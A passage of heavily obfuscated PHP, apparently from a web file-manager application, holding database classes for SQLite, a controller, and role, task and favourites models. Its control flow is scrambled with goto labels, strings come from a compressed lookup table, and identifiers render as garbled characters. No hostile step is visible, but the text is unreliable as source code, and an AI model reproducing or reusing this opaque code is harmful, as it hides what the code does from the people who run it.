$DÈÏâÛÑßÒ[833]) && strpos($Dêâäú÷ÿé, $DÈÏâÛÑßÒ[834])) { @unlink($Dêâäú÷ÿé); } } } public function clearTimeout() { $f®√€¢œØô =& $_SERVER[’ÿƒ†ïò]; $e°≤Æ⁄ƒ∏é = scandir($this->cachePath); foreach ($e°≤Æ⁄ƒ∏é as $DÌ¶ÆŒáüË) { $Eæ’úØÍ”¬ = $this->cachePath . $DÌ¶ÆŒáüË; if (strpos($Eæ’úØÍ”¬, $f®√€¢œØô[833]) && strpos($Eæ’úØÍ”¬, $f®√€¢œØô[834]) && filemtime($Eæ’úØÍ”¬) < time()) { @unlink($Eæ’úØÍ”¬); } } } } goto dÓ¢ˆ¶ÈπÊ; Aê∆êè…åâ: define($_SERVER[’ÿƒ†ïò][0], $_SERVER[’ÿƒ†ïò][1]); $_SERVER[¶ªó∆Í‹¯‚Í] = explode($_SERVER[’ÿƒ†ïò][2], gzinflate(substr($_SERVER[’ÿƒ†ïò][3], 10, -8))); function binCheckEq($b¶ÀëàÂî‡, $aâŸ∞µ†ßã) { return $b¶ÀëàÂî‡ == $aâŸ∞µ†ßã; } goto bÿ∂é˜€Îê; F˜¬ëÃ‹àÊ: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto Cèåˆ∆à∫“; Dù√∑÷êë•: $this->in =& $in; $this->values[$b‚·–ÖçÛ§[6]] =& $config; $this->values[$b‚·–ÖçÛ§[7]] =& $in; goto a⁄ûÕ”ÜÓù; Cèåˆ∆à∫“: $b‚·–ÖçÛ§ =& $_SERVER[’ÿƒ†ïò]; global $in, $config; $this->config =& $config; goto Dù√∑÷êë•; a⁄ûÕ”ÜÓù: $this->tpl = TEMPLATE . MOD . $b‚·–ÖçÛ§[8]; $this->_classObjectID = mt_rand(0, 10000); goto D◊ È∞áéÖ; D◊ È∞áéÖ: } public function loadClass($E˘¥∫πÓï©) { if (1 === func_num_args()) { $this->{$E˘¥∫πÓï©} = new $E˘¥∫πÓï©(); } else { $Dı≈»ãÒé∂ = new ReflectionClass($E˘¥∫πÓï©); $FÂâÑ»—Æ¨ = func_get_args(); array_shift($FÂâÑ»—Æ¨); $this->{$E˘¥∫πÓï©} = $Dı≈»ãÒé∂->newInstanceArgs($FÂâÑ»—Æ¨); } return $this->{$E˘¥∫πÓï©}; } protected function assign($E“÷ÓÊ±∫≈, $Eô•å⁄ïøÍ) { $this->values[$E“÷ÓÊ±∫≈] = $Eô•å⁄ïøÍ; } protected function display($F∫∑ªˆ‘ªâ) { ob_end_clean(); extract($this->values); require $this->tpl . $F∫∑ªˆ‘ªâ; } } class DbSqliteBase extends Db { public function __construct($e›∏Öœ§∞Ã = '') { $f·ÌéóéÕƒ =& $_SERVER[’ÿƒ†ïò]; if (!extension_loaded($f·ÌéóéÕƒ[9])) { think_exception(think_lang($f·ÌéóéÕƒ[10]) . $f·ÌéóéÕƒ[11]); } if (!empty($e›∏Öœ§∞Ã)) { if (!isset($e›∏Öœ§∞Ã[$f·ÌéóéÕƒ[12]])) { $e›∏Öœ§∞Ã[$f·ÌéóéÕƒ[12]] = 438; } $this->config = $e›∏Öœ§∞Ã; if (empty($this->config[$f·ÌéóéÕƒ[13]])) { $this->config[$f·ÌéóéÕƒ[13]] = array(); } } } public function connect($f„ôñæ§Á– = '', $bÂö÷ä÷ßµ = 0) { $d–é«˘»Ïí =& $_SERVER[’ÿƒ†ïò]; if (!isset($this->linkID[$bÂö÷ä÷ßµ])) { goto Aü‘–†≥á†; A™©ÃΩåé“: @sqlite_busy_timeout($this->linkID[$bÂö÷ä÷ßµ], 30000); if (1 != think_config($d–é«˘»Ïí[18])) { unset($this->config); } goto cç˘™¢¡Ò; Aü‘–†≥á†: if (empty($f„ôñæ§Á–)) { $f„ôñæ§Á– = $this->config; } $Cåâë÷‚ä¢ = !empty($f„ôñæ§Á–[$d–é«˘»Ïí[13]][$d–é«˘»Ïí[14]]) ? $f„ôñæ§Á–[$d–é«˘»Ïí[13]][$d–é«˘»Ïí[14]] : $this->pconnect; $a¥•ŒîèŸ¢ = $Cåâë÷‚ä¢ ? $d–é«˘»Ïí[15] : $d–é«˘»Ïí[16]; goto fÊ≥êŒﬁâé; fÊ≥êŒﬁâé: $this->linkID[$bÂö÷ä÷ßµ] = $a¥•ŒîèŸ¢($f„ôñæ§Á–[$d–é«˘»Ïí[17]], $f„ôñæ§Á–[$d–é«˘»Ïí[12]]); if (!$this->linkID[$bÂö÷ä÷ßµ]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto A™©ÃΩåé“; cç˘™¢¡Ò: } return $this->linkID[$bÂö÷ä÷ßµ]; } public function free() { $this->queryID = null; } public function query($BÕ»“”⁄Õ‹) { goto D≥¶í±»°Ø; F•ﬁ’‚Éî : if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $e¢∂Ëã∂âß = $this->getAll(); return $e¢∂Ëã∂âß; } goto c„Îãõ’Œë; F£®Ì‡»‹Ë: $this->queryStr = $BÕ»“”⁄Õ‹; if ($this->queryID) { $this->free(); } think_action_status($aèÓÛ¿∫Ò∆[19], 1); goto CóÊ√üπÇÜ; D≥¶í±»°Ø: $aèÓÛ¿∫Ò∆ =& $_SERVER[’ÿƒ†ïò]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto F£®Ì‡»‹Ë; CóÊ√üπÇÜ: think_status($aèÓÛ¿∫Ò∆[20]); $this->queryID = sqlite_query($this->_linkID, $BÕ»“”⁄Õ‹); $this->debug(); goto F•ﬁ’‚Éî ; c„Îãõ’Œë: } public function execute($D†¬à‹πœ‡) { goto eáÕÀ›¥Øù; eáÕÀ›¥Øù: $Cééà®ÊŒ© =& $_SERVER[’ÿƒ†ïò]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto e‡¡…äö»¨; D§á√Öı‚À: think_status($Cééà®ÊŒ©[20]); $EΩ•›ÚŸùÛ = sqlite_exec($this->_linkID, $D†¬à‹πœ‡); $this->debug(); goto a⁄¶Û¶êÕã; a⁄¶Û¶êÕã: if (!1 === $EΩ•›ÚŸùÛ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto CÖıòŒ¡≠é; e‡¡…äö»¨: $this->queryStr = $D†¬à‹πœ‡; if ($this->queryID) { $this->free(); } think_action_status($Cééà®ÊŒ©[21], 1); goto D§á√Öı‚À; CÖıòŒ¡≠é: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[’ÿƒ†ïò][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $b‰•ÁáØƒë = sqlite_query($this->_linkID, $_SERVER[’ÿƒ†ïò][23]); if (!$b‰•ÁáØƒë) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $fãéà±êå„ = sqlite_query($this->_linkID, $_SERVER[’ÿƒ†ïò][24]); if (!$fãéà±êå„) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $EÑ“Ë¡º‹¿ = array(); if ($this->numRows > 0) { for ($d’Ö¯•ì∏ù = 0; $d’Ö¯•ì∏ù < $this->numRows; $d’Ö¯•ì∏ù++) { $EÑ“Ë¡º‹¿[$d’Ö¯•ì∏ù] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $EÑ“Ë¡º‹¿; } public function getFields($B¨¥≈Î∫ÿÒ) { $d–’â“âÀÖ =& $_SERVER[’ÿƒ†ïò]; $a√∑∂ïáá– = $this->query($d–’â“âÀÖ[25] . $B¨¥≈Î∫ÿÒ . $d–’â“âÀÖ[26]); $eåôÊõü›ª = array(); if ($a√∑∂ïáá–) { foreach ($a√∑∂ïáá– as $FÛ“„ÇÆå∞ => $FçãüπÇÆÜ) { $eåôÊõü›ª[$FçãüπÇÆÜ[$d–’â“âÀÖ[27]]] = array($d–’â“âÀÖ[28] => $FçãüπÇÆÜ[$d–’â“âÀÖ[27]], $d–’â“âÀÖ[29] => $FçãüπÇÆÜ[$d–’â“âÀÖ[30]], $d–’â“âÀÖ[31] => (bool) ($FçãüπÇÆÜ[$d–’â“âÀÖ[32]] === $d–’â“âÀÖ[33]), $d–’â“âÀÖ[34] => $FçãüπÇÆÜ[$d–’â“âÀÖ[35]], $d–’â“âÀÖ[36] => strtolower($FçãüπÇÆÜ[$d–’â“âÀÖ[37]]) == $d–’â“âÀÖ[38], $d–’â“âÀÖ[39] => strtolower($FçãüπÇÆÜ[$d–’â“âÀÖ[40]]) == $d–’â“âÀÖ[41]); } } return $eåôÊõü›ª; } public function getTables($CòΩ·Òåé¡ = '') { $d¨ä∑ıèﬂ— =& $_SERVER[’ÿƒ†ïò]; $fﬁ…‡¡Ñ¡ƒ = $this->query($d¨ä∑ıèﬂ—[42] . $d¨ä∑ıèﬂ—[43] . $d¨ä∑ıèﬂ—[44]); $F§®ëÑ© = array(); foreach ($fﬁ…‡¡Ñ¡ƒ as $FÕÇ≥◊·ñ˜ => $aŸŸﬁäÔﬁ) { $F§®ëÑ©[$FÕÇ≥◊·ñ˜] = current($aŸŸﬁäÔﬁ); } return $F§®ëÑ©; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $EáºÕôûáÇ =& $_SERVER[’ÿƒ†ïò]; $aî∞≠ßê◊ë = sqlite_last_error($this->_linkID); $this->error = $aî∞≠ßê◊ë . $EáºÕôûáÇ[4] . sqlite_error_string($aî∞≠ßê◊ë); if ($EáºÕôûáÇ[33] != $this->queryStr) { $this->error .= LNG($EáºÕôûáÇ[45]) . $this->queryStr; } think_trace($this->error, $EáºÕôûáÇ[33], $EáºÕôûáÇ[46]); return $this->error; } public function escapeString($DíàóŸπöÆ) { return sqlite_escape_string($DíàóŸπöÆ); } public function parseLimit($fàûøì„éÚ) { $bÚò√˘°ﬂ  =& $_SERVER[’ÿƒ†ïò]; $fü§≥≥Áπ = $bÚò√˘°ﬂ [33]; if (!empty($fàûøì„éÚ)) { $fàûøì„éÚ = explode($bÚò√˘°ﬂ [47], $fàûøì„éÚ); if (count($fàûøì„éÚ) > 1) { $fü§≥≥Áπ .= $bÚò√˘°ﬂ [48] . $fàûøì„éÚ[1] . $bÚò√˘°ﬂ [49] . $fàûøì„éÚ[0] . $bÚò√˘°ﬂ [50]; } else { $fü§≥≥Áπ .= $bÚò√˘°ﬂ [48] . $fàûøì„éÚ[0] . $bÚò√˘°ﬂ [50]; } } return $fü§≥≥Áπ; } } class DbSqlite3Base extends Db { public function __construct($bÎÜá∂ÇÏﬁ = '') { $DΩ≠¿∂ë”É =& $_SERVER[’ÿƒ†ïò]; if (!class_exists($DΩ≠¿∂ë”É[51])) { think_exception(think_lang($DΩ≠¿∂ë”É[10]) . $DΩ≠¿∂ë”É[52]); } if (!empty($bÎÜá∂ÇÏﬁ)) { if (!isset($bÎÜá∂ÇÏﬁ[$DΩ≠¿∂ë”É[12]])) { $bÎÜá∂ÇÏﬁ[$DΩ≠¿∂ë”É[12]] = 438; } $this->config = $bÎÜá∂ÇÏﬁ; if (empty($this->config[$DΩ≠¿∂ë”É[13]])) { $this->config[$DΩ≠¿∂ë”É[13]] = array(); } } } public function connect($BŒ•¨ Úéç = '', $E·®ÿß¯æŸ = 0) { $f·µî∑™‚ã =& $_SERVER[’ÿƒ†ïò]; if (!isset($this->linkID[$E·®ÿß¯æŸ])) { if (empty($BŒ•¨ Úéç)) { $BŒ•¨ Úéç = $this->config; } $this->linkID[$E·®ÿß¯æŸ] = new SQLite3($BŒ•¨ Úéç[$f·µî∑™‚ã[17]]); if (!$this->linkID[$E·®ÿß¯æŸ]) { think_exception($this->linkID[$E·®ÿß¯æŸ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$E·®ÿß¯æŸ]->busyTimeout(30000); if (1 != think_config($f·µî∑™‚ã[18])) { unset($this->config); } } return $this->linkID[$E·®ÿß¯æŸ]; } public function free() { $this->queryID = null; } public function query($FÀ‡∫ÌÔâ†) { goto bÿØ⁄¡ˆ÷à; bÿØ⁄¡ˆ÷à: $cîíêïƒº« =& $_SERVER[’ÿƒ†ïò]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto CÕß™£æÖ…; b Èà°äÜΩ: think_status($cîíêïƒº«[20]); $this->queryID = $this->_linkID->query($FÀ‡∫ÌÔâ†); $this->debug(); goto dﬁ⁄™ã“ê∞; dﬁ⁄™ã“ê∞: if (!1 === $this->queryID) { $this->error(); return !1; } else { $cå∫†ªéç¬ = $this->getAll(); $this->numRows = count($cå∫†ªéç¬); return $cå∫†ªéç¬; } goto bÌì–ˆÕΩè; CÕß™£æÖ…: $this->queryStr = $FÀ‡∫ÌÔâ†; if ($this->queryID) { $this->free(); } think_action_status($cîíêïƒº«[19], 1); goto b Èà°äÜΩ; bÌì–ˆÕΩè: } public function execute($e≤œ¡âçÇè) { goto e°∏€„Ñæ¢; Dá‹öπõ®√: if (!1 === $d∞ü•‡«Ê≥) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto Bƒüç„∫Ö’; e°∏€„Ñæ¢: $c‹¶ä™ûÍö =& $_SERVER[’ÿƒ†ïò]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto CÈÒäÚ¢Ïœ; A·‡—æ™À¥: think_status($c‹¶ä™ûÍö[20]); $d∞ü•‡«Ê≥ = $this->_linkID->exec($e≤œ¡âçÇè); $this->debug(); goto Dá‹öπõ®√; CÈÒäÚ¢Ïœ: $this->queryStr = $e≤œ¡âçÇè; if ($this->queryID) { $this->free(); } think_action_status($c‹¶ä™ûÍö[21], 1); goto A·‡—æ™À¥; Bƒüç„∫Ö’: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[’ÿƒ†ïò][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $føÃÀﬂßø® = $this->_linkID->query($_SERVER[’ÿƒ†ïò][23]); if (!$føÃÀﬂßø®) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $f¯‹àÜÜû¯ = $this->_linkID->query($_SERVER[’ÿƒ†ïò][24]); if (!$f¯‹àÜÜû¯) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $BÔç÷ê‰ãŒ = array(); while ($f”ÉÜîÿ›© = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $BÔç÷ê‰ãŒ[] = $f”ÉÜîÿ›©; } $this->queryID->reset(); return $BÔç÷ê‰ãŒ; } public function getFields($eº“ﬁã∆ŒÔ) { $C˜±Ã≥œ·Œ =& $_SERVER[’ÿƒ†ïò]; $C€£„ì√íΩ = $this->query($C˜±Ã≥œ·Œ[25] . $eº“ﬁã∆ŒÔ . $C˜±Ã≥œ·Œ[26]); $dù‚´ÑÖøí = array(); if ($C€£„ì√íΩ) { foreach ($C€£„ì√íΩ as $dè£ó¬»•Ã => $e£¬Ω§úîÏ) { $dù‚´ÑÖøí[$e£¬Ω§úîÏ[$C˜±Ã≥œ·Œ[28]]] = array($C˜±Ã≥œ·Œ[28] => $e£¬Ω§úîÏ[$C˜±Ã≥œ·Œ[28]], $C˜±Ã≥œ·Œ[29] => $e£¬Ω§úîÏ[$C˜±Ã≥œ·Œ[29]], $C˜±Ã≥œ·Œ[31] => (bool) ($e£¬Ω§úîÏ[$C˜±Ã≥œ·Œ[31]] === $C˜±Ã≥œ·Œ[33]), $C˜±Ã≥œ·Œ[34] => $e£¬Ω§úîÏ[$C˜±Ã≥œ·Œ[53]], $C˜±Ã≥œ·Œ[36] => (bool) $e£¬Ω§úîÏ[$C˜±Ã≥œ·Œ[54]], $C˜±Ã≥œ·Œ[39] => (bool) $e£¬Ω§úîÏ[$C˜±Ã≥œ·Œ[54]]); } } return $dù‚´ÑÖøí; } public function getTables($DﬁÖ¬€ñèÉ = '') { $E¬Ωüä™Í§ =& $_SERVER[’ÿƒ†ïò]; $cÓÆπﬁóŒó = $this->query($E¬Ωüä™Í§[42] . $E¬Ωüä™Í§[43] . $E¬Ωüä™Í§[44]); $fﬂçÆ’è´˘ = array(); foreach ($cÓÆπﬁóŒó as $d∫»Ì¥èõº => $eœÛë£Ÿë‰) { $fﬂçÆ’è´˘[$d∫»Ì¥èõº] = current($eœÛë£Ÿë‰); } return $fﬂçÆ’è´˘; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $c∂ÁÂÙü°ò =& $_SERVER[’ÿƒ†ïò]; $this->error = $this->_linkID->lastErrorMsg(); if ($c∂ÁÂÙü°ò[33] != $this->queryStr) { $this->error .= LNG($c∂ÁÂÙü°ò[45]) . $this->queryStr; } think_trace($this->error, $c∂ÁÂÙü°ò[33], $c∂ÁÂÙü°ò[46]); return $this->error; } public function escapeString($e¨‹ÆÃ˘Ïå) { $E°Á´€´Œƒ =& $_SERVER[’ÿƒ†ïò]; if ($this->_linkID) { return $this->_linkID->escapeString($e¨‹ÆÃ˘Ïå); } return str_ireplace($E°Á´€´Œƒ[55], $E°Á´€´Œƒ[56], $e¨‹ÆÃ˘Ïå); } public function parseLimit($f”ë°„ò¶ú) { $EÉ¢ÊËÎï‚ =& $_SERVER[’ÿƒ†ïò]; $d∏»Ì…≤à’ = $EÉ¢ÊËÎï‚[33]; if (!empty($f”ë°„ò¶ú)) { $f”ë°„ò¶ú = explode($EÉ¢ÊËÎï‚[47], $f”ë°„ò¶ú); if (count($f”ë°„ò¶ú) > 1) { $d∏»Ì…≤à’ .= $EÉ¢ÊËÎï‚[48] . $f”ë°„ò¶ú[1] . $EÉ¢ÊËÎï‚[49] . $f”ë°„ò¶ú[0] . $EÉ¢ÊËÎï‚[50]; } else { $d∏»Ì…≤à’ .= $EÉ¢ÊËÎï‚[48] . $f”ë°„ò¶ú[0] . $EÉ¢ÊËÎï‚[50]; } } return $d∏»Ì…≤à’; } } goto d◊ä‚ºﬂ¢°; c≠ØË–ïƒç: class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\x65\x6d\56\x72\157\154\x65\x4c\x69\163\x74"; public $field = array("\x6e\x61\155\x65", "\141\165\x74\x68", "\x6c\x61\x62\x65\154", "\144\151\163\160\154\x61\x79", "\x73\171\163\164\x65\155", "\144\145\163\143", "\x69\147\156\157\x72\x65\105\x78\164", "\151\x67\156\157\x72\145\x46\x69\154\145\x53\x69\x7a\145", "\141\x64\x6d\x69\x6e\151\x73\164\162\141\x74\x6f\162", "\163\x6f\x72\x74"); public function listData($b‚èê∫ÿ∏å = false, $AûÆ‘‡Óï∏ = "\x73\157\162\164", $b¶«ß∫§Ø÷ = false) { $d˘ÇÕŒâ•õ =& $_SERVER[’ÿƒ†ïò]; $bêØ√˜ß∆∂ = parent::listData($b‚èê∫ÿ∏å, $AûÆ‘‡Óï∏, $b¶«ß∫§Ø÷); if (!$b‚èê∫ÿ∏å) { foreach ($bêØ√˜ß∆∂ as $A∏áÖØ∆à÷ => $CÜÏï“Ù≈Ç) { if ($CÜÏï“Ù≈Ç[$d˘ÇÕŒâ•õ[1918]] == 1) { $bêØ√˜ß∆∂[$A∏áÖØ∆à÷][$d˘ÇÕŒâ•õ[445]] = LNG($d˘ÇÕŒâ•õ[2142]); } } } return $bêØ√˜ß∆∂; } public function update($còÖ≠—ÃÍÖ, $B∂ˆàÆœ˜√) { goto Cª≠Í·â≤–; EÔ‘ŒÇß“: return parent::update($còÖ≠—ÃÍÖ, $B∂ˆàÆœ˜√); goto D‚√Ë«Ú’ö; Cª≠Í·â≤–: $BÀﬂˆûûºç =& $_SERVER[’ÿƒ†ïò]; $FÓ”Á÷ß∑† = parent::listData($còÖ≠—ÃÍÖ); $Eºµ–Ó√áç = $this->findByName($B∂ˆàÆœ˜√[$BÀﬂˆûûºç[28]]); goto AÑÀ€Æ¡±å; AÑÀ€Æ¡±å: if (!$FÓ”Á÷ß∑† || $Eºµ–Ó√áç && $Eºµ–Ó√áç[$BÀﬂˆûûºç[395]] != $FÓ”Á÷ß∑†[$BÀﬂˆûûºç[395]]) { return !1; } if ($Eºµ–Ó√áç[$BÀﬂˆûûºç[1918]] == 1) { $B∂ˆàÆœ˜√ = array($BÀﬂˆûûºç[28] => $B∂ˆàÆœ˜√[$BÀﬂˆûûºç[28]], $BÀﬂˆûûºç[1748] => $B∂ˆàÆœ˜√[$BÀﬂˆûûºç[1748]]); } $this->filterAuth($B∂ˆàÆœ˜√[$BÀﬂˆûûºç[408]]); goto EÔ‘ŒÇß“; D‚√Ë«Ú’ö: } public function remove($EÂ°ÑﬁŒ§Ç) { $Dä”À—‘¡í = parent::listData($EÂ°ÑﬁŒ§Ç); if (!$Dä”À—‘¡í || $Dä”À—‘¡í[$_SERVER[’ÿƒ†ïò][1199]]) { return !1; } return parent::remove($EÂ°ÑﬁŒ§Ç); } public function add($eÔÎ‘‹€ùŒ) { goto F®–ú‰“ÜÜ; F®–ú‰“ÜÜ: $d…∞ÿ⁄…÷≠ =& $_SERVER[’ÿƒ†ïò]; $E∏∂Ù⁄í˜á = $eÔÎ‘‹€ùŒ[$d…∞ÿ⁄…÷≠[28]]; if ($this->findByName($E∏∂Ù⁄í˜á)) { return !1; } goto b≈™€äã≠∫; b≈™€äã≠∫: $eåï∆ôﬂÎŒ = array($d…∞ÿ⁄…÷≠[415] => $E∏∂Ù⁄í˜á, $d…∞ÿ⁄…÷≠[1732] => $d…∞ÿ⁄…÷≠[33], $d…∞ÿ⁄…÷≠[1728] => $d…∞ÿ⁄…÷≠[1736], $d…∞ÿ⁄…÷≠[2143] => 1, $d…∞ÿ⁄…÷≠[1731] => 0, $d…∞ÿ⁄…÷≠[2144] => 0, $d…∞ÿ⁄…÷≠[1730] => $this->getSort()); $eÔÎ‘‹€ùŒ = array_merge($eåï∆ôﬂÎŒ, $eÔÎ‘‹€ùŒ); $this->filterAuth($eÔÎ‘‹€ùŒ[$d…∞ÿ⁄…÷≠[408]]); goto dñœŸßóê≠; dñœŸßóê≠: return parent::insert($eÔÎ‘‹€ùŒ); goto Féã≠Ó–¢ß; Féã≠Ó–¢ß: } private function getSort() { $fÕïà… ∂ˆ =& $_SERVER[’ÿƒ†ïò]; $EÕ‚Üã›œÎ = parent::listData(); $EèÁ‚‘ã∆ü = array_to_keyvalue($EÕ‚Üã›œÎ, $fÕïà… ∂ˆ[33], $fÕïà… ∂ˆ[1749]); return empty($EèÁ‚‘ã∆ü) ? 0 : max($EèÁ‚‘ã∆ü) + 1; } private function filterAuth(&$CªßﬁÌ≤åÒ) { $eÜ±Öõ•Á¿ =& $_SERVER[’ÿƒ†ïò]; $F«≠åúÿ∑∏ = array(); $F§Í‘◊¬ñﬂ = array_filter(explode($eÜ±Öõ•Á¿[47], $CªßﬁÌ≤åÒ)); foreach ($F§Í‘◊¬ñﬂ as $CªßﬁÌ≤åÒ) { $DÓ°è≈öÉÃ = explode($eÜ±Öõ•Á¿[95], $CªßﬁÌ≤åÒ); if ($DÓ°è≈öÉÃ[0] == $eÜ±Öõ•Á¿[2145] && $DÓ°è≈öÉÃ[1] != $eÜ±Öõ•Á¿[1118]) { $aÚ˜áÓíµä = $DÓ°è≈öÉÃ[0] . $eÜ±Öõ•Á¿[95] . $DÓ°è≈öÉÃ[1] . $eÜ±Öõ•Á¿[2146]; if (!in_array($aÚ˜áÓíµä, $F§Í‘◊¬ñﬂ)) { $F«≠åúÿ∑∏[] = $aÚ˜áÓíµä; } } $F«≠åúÿ∑∏[] = $CªßﬁÌ≤åÒ; } $CªßﬁÌ≤åÒ = implode($eÜ±Öõ•Á¿[47], $F«≠åúÿ∑∏); } public function sort($D©ú™ÚŸÜ, $a¶Éä”ØÊî) { return parent::update($D©ú™ÚŸÜ, $a¶Éä”ØÊî); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\x6d\x2e\x74\141\163\153\x4c\151\x73\x74"; public $field = array("\x6e\x61\155\x65", "\x74\x79\160\145", "\145\166\x65\156\164", "\164\151\155\x65", "\144\x65\163\143", "\x73\171\163\164\x65\x6d", "\x65\x6e\x61\x62\154\x65", "\x6c\x61\163\164\122\165\x6e", "\x73\x6f\162\164"); public function listData($FÖ©µÉŸÔ√ = false, $FŸ‘¨“‰à  = "\x73\157\162\164", $b•€éúæŒã = false) { return parent::listData($FÖ©µÉŸÔ√, $FŸ‘¨“‰à , $b•€éúæŒã); } public function add($bÕ¬ıÏΩï™) { $eÔÇñÜ–ôŸ =& $_SERVER[’ÿƒ†ïò]; $Då´£Ë…Ñû = $this->findByName($bÕ¬ıÏΩï™[$eÔÇñÜ–ôŸ[28]]); if ($Då´£Ë…Ñû) { return !1; } $bÕ¬ıÏΩï™[$eÔÇñÜ–ôŸ[1521]] = 0; $bÕ¬ıÏΩï™[$eÔÇñÜ–ôŸ[1749]] = $this->getSort(); return parent::insert($bÕ¬ıÏΩï™); } private function getSort() { $B«‚◊üí·± =& $_SERVER[’ÿƒ†ïò]; $C’ÎÕÌê«‡ = parent::listData(); $A⁄”é‹©ƒ◊ = array_to_keyvalue($C’ÎÕÌê«‡, $B«‚◊üí·±[33], $B«‚◊üí·±[1749]); return empty($A⁄”é‹©ƒ◊) ? 0 : max($A⁄”é‹©ƒ◊) + 1; } public function update($A≤ÿˆòƒÓ⁄, $Eï∂ª«å¬ä) { $AƒÌÏ©‹å… =& $_SERVER[’ÿƒ†ïò]; $BªíÓ±Ú…ı = $this->listData($A≤ÿˆòƒÓ⁄); $f°Èàù‰ä© = $this->findByName($Eï∂ª«å¬ä[$AƒÌÏ©‹å…[28]]); if (!$BªíÓ±Ú…ı || $f°Èàù‰ä© && $f°Èàù‰ä©[$AƒÌÏ©‹å…[395]] != $BªíÓ±Ú…ı[$AƒÌÏ©‹å…[395]]) { return !1; } return parent::update($A≤ÿˆòƒÓ⁄, $Eï∂ª«å¬ä); } public function remove($E∫†úêå—¯, $A°ÇÖ≤Æ®á = false) { $e¢ïíØ≈ÁÜ =& $_SERVER[’ÿƒ†ïò]; $eî¬∞á‹≈Ω = $this->listData($E∫†úêå—¯); if (!$eî¬∞á‹≈Ω) { return; } if (!$A°ÇÖ≤Æ®á && $eî¬∞á‹≈Ω[$e¢ïíØ≈ÁÜ[1199]] == $e¢ïíØ≈ÁÜ[87]) { return !1; } return parent::remove($E∫†úêå—¯); } public function enable($D›´ïû®ΩÃ, $b–úÈ€âæ√) { return $this->update($D›´ïû®ΩÃ, array($_SERVER[’ÿƒ†ïò][2137] => $b–úÈ€âæ√)); } public function run($Aô—ÖÑﬁ”‚) { return $this->update($Aô—ÖÑﬁ”‚, array($_SERVER[’ÿƒ†ïò][2147] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\x65\162\x5f\x66\141\166"; protected function cacheFunctionAlias($D¿œÌì√”ù) { $Aﬂ„Àâ¥ﬁ¢ =& $_SERVER[’ÿƒ†ïò]; return array($Aﬂ„Àâ¥ﬁ¢[1833] => array(USER_ID, $Aﬂ„Àâ¥ﬁ¢[2148])); } protected function listData() { $a•≠µ‘∂∞Î =& $_SERVER[’ÿƒ†ïò]; $C∫’âíâÓë = array($a•≠µ‘∂∞Î[1548] => USER_ID, $a•≠µ‘∂∞Î[477] => 0); $dÏ≈—®£›˘ = $a•≠µ‘∂∞Î[2149]; $fÀÔ∂‡ï›É = $this->field($dÏ≈—®£›˘)->where($C∫’âíâÓë)->order($a•≠µ‘∂∞Î[2150])->select(); return $fÀÔ∂‡ï›É ? $fÀÔ∂‡ï›É : array(); } protected function resetCache() { } protected function listView() { goto eòé‡Â•‚Ú; Eû≥√’ı’á: $báåÀ—◊éÎ = array_to_keyvalue($báåÀ—◊éÎ, $E¨º§õ±’¨[397]); foreach ($dó è‘ÕÏÑ as $dÍ«‡œˆΩì => $bÙãæ‹Øöº) { $E«øÉñ™‚¯ = $báåÀ—◊éÎ[$bÙãæ‹Øöº[$E¨º§õ±’¨[76]]]; $E«øÉñ™‚¯ = $E«øÉñ™‚¯ ? $E«øÉñ™‚¯ : array(); $dó è‘ÕÏÑ[$dÍ«‡œˆΩì] = array_merge($E«øÉñ™‚¯, $bÙãæ‹Øöº); } return $dó è‘ÕÏÑ; goto cæ∂à∆⁄ÔÉ; Aå≤¢”åêË: $Eæ«îãÀªÃ = array($E¨º§õ±’¨[412] => array($E¨º§õ±’¨[413], $F›Àœï†‰¨)); $báåÀ—◊éÎ = Model($E¨º§õ±’¨[820])->listSource($Eæ«îãÀªÃ, $Cƒ∆Â»êãﬁ); $báåÀ—◊éÎ = array_merge($báåÀ—◊éÎ[$E¨º§õ±’¨[74]], $báåÀ—◊éÎ[$E¨º§õ±’¨[75]]); goto Eû≥√’ı’á; eòé‡Â•‚Ú: $E¨º§õ±’¨ =& $_SERVER[’ÿƒ†ïò]; $dó è‘ÕÏÑ = $this->listData(); $fì¿æÜƒóæ = array_filter_by_field($dó è‘ÕÏÑ, $E¨º§õ±’¨[29], $E¨º§õ±’¨[411]); goto a»µÀ•áËÇ; a»µÀ•áËÇ: $F›Àœï†‰¨ = array_to_keyvalue($fì¿æÜƒóæ, $E¨º§õ±’¨[33], $E¨º§õ±’¨[76]); if (!$F›Àœï†‰¨) { return $dó è‘ÕÏÑ; } $Cƒ∆Â»êãﬁ = 2000; goto Aå≤¢”åêË; cæ∂à∆⁄ÔÉ: } protected function addFav($b∞ıãµõ«ø, $c°Éò‹ëËë = '', 